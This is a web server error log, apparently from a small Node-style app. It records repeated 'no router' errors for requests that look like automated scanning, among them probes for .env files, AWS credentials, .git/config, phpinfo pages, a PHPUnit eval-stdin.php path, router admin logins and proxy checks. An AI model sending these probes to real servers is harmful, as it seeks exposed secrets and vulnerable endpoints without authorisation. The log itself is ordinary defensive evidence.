{"level":"error","message":"GET /_profiler/phpinfo 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /phpinfo.php 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /phpinfo 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /aws.yml 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.env.bak 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /info.php 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.aws/credentials 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /config/aws.yml 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /config.js 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST /HNAP1/ 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"HEAD / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /favicon.ico 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET http://azenv.net/ 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /apple-touch-icon-precomposed.png 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /apple-touch-icon.png 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /apple-touch-icon-precomposed.png 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /apple-touch-icon.png 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /client/get_targets 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /upl.php 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /geoip/ 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /favicon.ico 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /1.php 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /bundle.js 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /files/ 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /apple-touch-icon-precomposed.png 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /apple-touch-icon.png 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST /boaform/admin/formLogin 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.git/config 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /favicon.ico 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /favicon.ico 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.git/config 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /favicon.ico 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /geoserver/web/ 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /aws-config.php 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST /boaform/admin/formLogin 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /Public/home/js/check.js 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /static/admin/javascript/hetong.js 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST /boaform/admin/formLogin 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /apple-touch-icon-precomposed.png 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /apple-touch-icon.png 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /favicon.ico 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /wp-includes/css/buttons.css 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /media/system/js/core.js 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET http://www.google.com/ 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /apple-touch-icon-precomposed.png 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /apple-touch-icon.png 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /apple-touch-icon-precomposed.png 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /apple-touch-icon.png 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /join?error=exist 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /portal/redlion 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /hudson 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST /boaform/admin/formLogin 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST /boaform/admin/formLogin 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST /groupbuying 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST /groupbuying 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /grouppurchase/gpitem?gpId=7 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /grouppurchase/gpitem?gpId=7 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /grouppurchase/gpitem?gpId=7 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /grouppurchase/gpitem?gpId=7 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /grouppurchase/gpitem?gpId=7 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /grouppurchase/gpitem?gpId=7 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /grouppurchase/gpitem?gpId=7 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /grouppurchase/gpitem?gpId=7 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /grouppurchase/gpitem?gpId=7 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /grouppurchase/gpitem?gpId=7 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /grouppurchase/gpitem?gpId=7 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /join?error=exist 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /GGMijdksfjkjdf/?target=1&port=1&time=1&method=1key= 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /favicon.ico 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /favicon.ico 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.git/config 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /sendgrid/.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET http://www.google.com/ 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /conf/.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /wp-content/.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /wp-admin/.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /library/.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /new/.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /vendor/.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /old/.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /local/.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /api/.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /blog/.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /crm/.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /admin/.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /laravel/.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /app/.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /app/config/.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /apps/.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /audio/.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /cgi-bin/.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /backend/.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /src/.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /base/.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /core/.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /vendor/laravel/.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /storage/.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /protected/.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /newsite/.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /www/.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /sites/all/libraries/mailchimp/.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /database/.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /public/.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /ec2-3-34-24-220.ap-northeast-2.compute.amazonaws.com/.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"HEAD / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /aaa9 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /aab8 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"HEAD /.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST /api/v0/id 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /showLogin.cc 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /api 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST /boaform/admin/formLogin 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /client/get_targets 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /upl.php 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /geoip/ 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /favicon.ico 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /1.php 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /bundle.js 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /files/ 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /JwNM 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /X6vY 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /aab8 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /jquery-3.3.1.slim.min.js 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /aab9 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /jquery-3.3.2.slim.min.js 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET http://5.188.210.227/echo.php 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /favicon.ico 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /geoserver/web/ 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /ReportServer 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST /grouppurchase/updategp?gpId=42 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST /grouppurchase/updategp?gpId=42 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /druid/index.html 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST /grouppurchase/updategp?gpId=42 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST /grouppurchase/updategp?gpId=42 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST /grouppurchase/updategp?gpId=42 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST /grouppurchase/updategp?gpId=43 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /boaform/admin/formLogin?username=ec8&psd=ec8 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST / 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.git/config 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.env.development 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST /.env.development 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.env.dist 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST /.env.dist 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.env.project 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST /.env.project 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /script/.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST /script/.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /shared/.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST /shared/.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.env.old 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST /.env.old 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /fedex/.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST /fedex/.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /live_env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST /live_env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /sources/.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST /sources/.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.env.save 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST /.env.save 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /back/.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST /back/.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /core/.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST /core/.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /docker/.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST /docker/.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /api/.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST /api/.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /local/.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST /local/.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /apps/.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST /apps/.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /cms/.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST /cms/.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /enviroments/.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST /enviroments/.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /app/.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST /app/.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /development/.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST /development/.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /laravel/.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST /laravel/.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST /.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /system/.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST /system/.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"GET /application/.env 라우터가 없습니다."}
{"level":"info","message":"hello"}
{"level":"error","message":"POST /application/.env 라우터가 없습니다."}
